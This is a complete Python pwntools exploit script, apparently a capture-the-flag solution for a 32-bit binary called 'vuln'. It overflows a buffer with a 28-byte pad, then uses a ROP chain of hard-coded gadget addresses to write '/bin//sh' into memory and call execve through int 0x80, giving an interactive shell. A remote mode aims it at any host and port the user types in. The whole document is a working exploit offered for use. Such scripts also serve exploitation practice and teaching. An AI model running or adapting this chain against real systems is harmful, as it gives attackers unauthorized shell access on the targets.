from pwn import *
import sys

context.binary  = binary = ELF("./vuln", checksec=False)
context.arch = 'i386'

gdbscript = """
b main
"""

mode = "l"

if (len(sys.argv) > 1) and (sys.argv[1].lower() in ["l", "d", "r"]):
	mode = sys.argv[1].lower()
else:
	print(f"\nUsage: python {sys.argv[0]} [MODE]")
	print("\tModes:")
	print("\t\tl\t:\tLocal Mode (default)")
	print("\t\td\t:\tDebug Mode")
	print("\t\tr\t:\tRemote Mode")

if mode == 'd':
	p = gdb.debug(binary.path, gdbscript=gdbscript)
elif mode == 'r':
	address = input("Target Address: ")
	port = int(input("Target Port: "))
	p = remote(address, port)
elif mode == 'l':
	p = process(binary.path)

pop_eax = p32(0x080b073a) # : pop eax ; ret
mov_ptr_eax_edx = p32(0x0809e5c8) # : mov dword ptr [eax], edx ; ret
pop_edx_ebx = p32(0x080583b9) # : pop edx ; pop ebx ; ret
pop_ecx = p32(0x08049e29) # : pop ecx ; ret
int_0x80 = p32(0x0804a3c2) # : int 0x80

writable = 0x80e62c8

def build_payload():
    # Overflow up to return address
    payload = b"A"*28
    
    # Write "/bin"
    payload += pop_eax
    payload += p32(writable)
    payload += pop_edx_ebx
    payload += b"/bin"
    payload += b"AAAA"
    payload += mov_ptr_eax_edx
    
    # Write "//sh"
    payload += pop_eax
    payload += p32(writable+0x04)
    payload += pop_edx_ebx
    payload += b"//sh"
    payload += b"AAAA"
    payload += mov_ptr_eax_edx
    
    # Write 0x00000000
    payload += pop_eax
    payload += p32(writable+0x08)
    payload += pop_edx_ebx
    payload += p32(0x00000000)
    payload += b"AAAA"
    payload += mov_ptr_eax_edx
    
    # Register Setup
    payload += pop_eax
    payload += p32(0x0000000b)
    
    payload += pop_edx_ebx
    payload += p32(0x00000000)
    payload += p32(writable)
    
    payload += pop_ecx
    payload += p32(0x00000000)
    
    # Syscall
    payload += int_0x80
    
    return payload

payload = build_payload()
print(p.recvuntil("\n").decode())
p.sendline(payload)

p.interactive()